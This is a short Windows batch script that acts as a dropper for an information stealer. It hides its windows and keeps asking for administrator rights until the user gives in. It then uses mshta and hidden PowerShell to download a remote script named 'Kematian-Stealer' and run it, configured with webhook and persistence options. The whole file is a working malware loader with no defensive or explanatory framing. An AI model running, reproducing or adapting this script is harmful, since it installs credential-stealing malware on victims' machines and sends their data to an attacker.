@echo off
cd /d "%~dp0"
net session >nul 2>&1
if not %errorlevel% == 0 ( powershell -Win Hidden -NoP -ExecutionPolicy Bypass "while(1){try{Start-Process -Verb RunAs -FilePath '%~f0';exit}catch{}}" & exit )
mshta vbscript:close(createobject("wscript.shell").run("powershell $ProgressPreference = 'SilentlyContinue';$t = Iwr -Uri 'https://raw.githubusercontent.com/ChildrenOfYahweh/Kematian-Stealer/main/frontend-src/main.ps1' -UseBasicParsing;$webhook = 'wbhkfrcuh';$debug = $true;$blockhostsfile = $false;$criticalprocess = $false;$melt = $false;$fakeerror = $false;$persistence = $false;$write_disk_only = $true | iex",0))